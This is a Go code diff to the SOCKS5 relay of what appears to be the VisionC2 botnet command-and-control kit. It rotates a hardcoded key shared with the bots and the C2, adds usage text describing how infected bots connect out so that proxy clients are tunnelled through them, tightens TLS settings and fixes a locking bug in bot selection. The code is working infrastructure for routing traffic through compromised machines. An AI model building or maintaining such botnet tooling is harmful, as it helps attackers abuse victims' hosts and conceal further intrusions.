@@ -65,7 +65,7 @@ var (
 // defaultAuthKey is the auth key baked in at build time by setup.py.
 // Must match bot syncToken / CNC MAGIC_CODE.
 // Can be overridden at runtime with -key flag.
-var defaultAuthKey = "bYcY7ti3gnS5E!#h" //change me run setup.py
+var defaultAuthKey = "CBjwz*5VBoj0IABQ" //change me run setup.py
 
 // ============================================================================
 // STATS — atomic counters for live monitoring
@@ -88,6 +88,21 @@ func main() {
 	certFile := flag.String("cert", "", "TLS certificate (auto-generated if empty)")
 	keyFile := flag.String("keyfile", "", "TLS private key (auto-generated if empty)")
 	statsAddr := flag.String("stats", "", "Stats endpoint (e.g. 127.0.0.1:9090) — plaintext CLI, off by default")
+	flag.Usage = func() {
+		fmt.Fprintf(flag.CommandLine.Output(),
+			"VisionC2 backconnect SOCKS5 relay\n\n"+
+				"Usage: %s [options]\n\n"+
+				"Bots connect out to -cp (TLS), SOCKS5 clients connect to -sp.\n"+
+				"Neither the C2 nor bots need a listening port.\n\n"+
+				"Options:\n", flag.CommandLine.Name())
+		flag.PrintDefaults()
+		fmt.Fprintf(flag.CommandLine.Output(),
+			"\nExamples:\n"+
+				"  %s -key secret -cp 9001 -sp 1080\n"+
+				"  %s -cert server.crt -keyfile server.key -stats 127.0.0.1:9090\n"+
+				"\nSecurity: -stats binds plaintext — bind to 127.0.0.1 only.\n",
+			flag.CommandLine.Name(), flag.CommandLine.Name())
+	}
 	flag.Parse()
 
 	// Use -key flag if provided, otherwise fall back to built-in default
@@ -120,7 +135,10 @@ func buildTLSConfig(certFile, keyFile string) *tls.Config {
 		if err != nil {
 			log.Fatalf("[RELAY] TLS load failed: %v", err)
 		}
-		return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
+		return &tls.Config{
+			Certificates: []tls.Certificate{cert},
+			MinVersion:   tls.VersionTLS13,
+		}
 	}
 	log.Println("[RELAY] No cert/key provided — generating ephemeral self-signed certificate")
 	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
@@ -128,7 +146,7 @@ func buildTLSConfig(certFile, keyFile string) *tls.Config {
 		SerialNumber: big.NewInt(1),
 		Subject:      pkix.Name{CommonName: "relay"},
 		NotBefore:    time.Now(),
-		NotAfter:     time.Now().Add(10 * 365 * 24 * time.Hour),
+		NotAfter:     time.Now().Add(365 * 24 * time.Hour), // 1 year, ephemeral
 		KeyUsage:     x509.KeyUsageDigitalSignature,
 		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
 	}
@@ -137,7 +155,10 @@ func buildTLSConfig(certFile, keyFile string) *tls.Config {
 	keyDER, _ := x509.MarshalECPrivateKey(key)
 	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
 	cert, _ := tls.X509KeyPair(certPEM, keyPEM)
-	return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
+	return &tls.Config{
+		Certificates: []tls.Certificate{cert},
+		MinVersion:   tls.VersionTLS13,
+	}
 }
 
 // ============================================================================
@@ -302,20 +323,25 @@ func handleSocksClient(clientConn net.Conn) {
 }
 
 func pickBot() *bot {
+	// Advance the round-robin counter before acquiring botsMu to avoid
+	// holding two locks simultaneously (botsMu + botRRMu was a deadlock
+	// waiting for a future caller to invert the order).
+	botRRMu.Lock()
+	idx := botRR
+	botRR++
+	botRRMu.Unlock()
+
 	botsMu.RLock()
 	defer botsMu.RUnlock()
-	if len(bots) == 0 {
+	n := len(bots)
+	if n == 0 {
 		return nil
 	}
-	ids := make([]string, 0, len(bots))
+	ids := make([]string, 0, n)
 	for id := range bots {
 		ids = append(ids, id)
 	}
-	botRRMu.Lock()
-	idx := botRR % len(ids)
-	botRR++
-	botRRMu.Unlock()
-	return bots[ids[idx]]
+	return bots[ids[idx%n]]
 }
 
 // bridge relays data bidirectionally, tracking bandwidth stats.
